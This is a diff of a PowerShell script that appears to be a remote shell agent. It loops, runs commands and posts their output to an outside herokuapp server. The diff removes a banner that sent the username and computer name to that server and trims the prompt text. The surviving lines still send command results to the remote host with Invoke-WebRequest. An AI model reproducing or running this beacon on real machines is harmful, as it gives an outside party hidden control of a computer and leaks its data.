@@ -3,9 +3,6 @@
 
 $__url = "https://unorubberserver.herokuapp.com/"
 
-$__params = @{output = "Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`nPS " + (pwd).Path + "> "}
-Invoke-WebRequest -UseBasicParsing -Uri ($__url + "update_output/") -Method POST -Body $__params
-
 while (1 -eq 1)
 {
 	$__cmd = ""
@@ -40,6 +37,6 @@ while (1 -eq 1)
 	$__output = $__result + ($error[0] | Out-String)
 	$error.clear()
 	
-	$__params = @{output = $__output + "`nPS " + (pwd).Path + "> "}
+	$__params = @{output = $__output}
 	Invoke-WebRequest -UseBasicParsing -Uri ($__url + "update_output/") -Method POST -Body $__params
 }
